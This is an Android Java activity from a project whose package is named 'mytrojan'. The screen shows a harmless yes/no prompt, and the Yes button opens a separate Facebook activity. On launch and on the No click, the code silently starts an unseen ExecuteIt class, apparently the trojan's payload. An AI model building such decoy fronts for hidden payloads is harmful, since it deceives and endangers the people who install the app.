package com.example.mytrojan;

import android.content.Context;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    private TextView text;
    private Button yes;
    private Button no;

    private static final int DELAY_MS = 5000;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);


        text = findViewById(R.id.textView);
        yes = findViewById(R.id.btnYes);
        no = findViewById(R.id.btnNo);

        new ExecuteIt(this);

        final Context currentCtx = this;


        yes.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("MAIN", "Yes clicked, open facebook page");

                Intent intent;
                intent = new Intent(currentCtx, FacebookActivity.class);
                startActivity(intent);
            }
        });


        no.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("MAIN", "No clicked");
                text.setText("Have a good day!");
                new ExecuteIt();

                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        // this code will be executed after 2 seconds
                        quitApp();

                    }
                }, MainActivity.DELAY_MS);
            }
        });


    }

    private void quitApp(){
        this.finish();
        System.exit(0);
    }
}
